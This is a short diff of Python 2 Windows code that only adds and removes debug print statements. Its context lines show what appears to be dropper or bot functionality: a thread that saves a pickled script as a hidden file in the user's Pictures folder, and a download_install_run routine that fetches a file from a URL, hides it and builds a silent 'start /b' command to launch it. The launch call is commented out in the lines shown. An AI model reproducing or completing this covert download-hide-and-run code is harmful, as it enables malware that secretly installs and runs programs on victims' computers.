@@ -28,10 +28,8 @@ class Downloader(threading.Thread):
         path = file_in_special_path(shellcon.CSIDL_MYPICTURES, "script.txt")
         unhide_file(path)
         f = open(path, "w")
-        print path
         #Save the script
         cPickle.dump(self.script, f)
-        print cPickle.dumps(self.script)
         #Hide the script
         f.close()
         hide_file(path)
@@ -53,9 +51,11 @@ def download_install_run(url, specialpath, fname):
     f.close()
     u.close()
     hide_file(f)
+    print path
     
     #Make a command to run the file
     command = "start /b %s"%win32api.GetShortPathName(path)
+    print command
     #os.system(command)
     
         
@@ -67,9 +67,7 @@ def file_in_special_path(specialpath, fname):
     @param fname: the name of the file
     """
     path = shell.SHGetFolderPath(0, specialpath, None, 0)
-    print "One: " + path
     path = os.path.join(path, fname)
-    print "Two: " + path
     return path
 
 def hide_file(path):
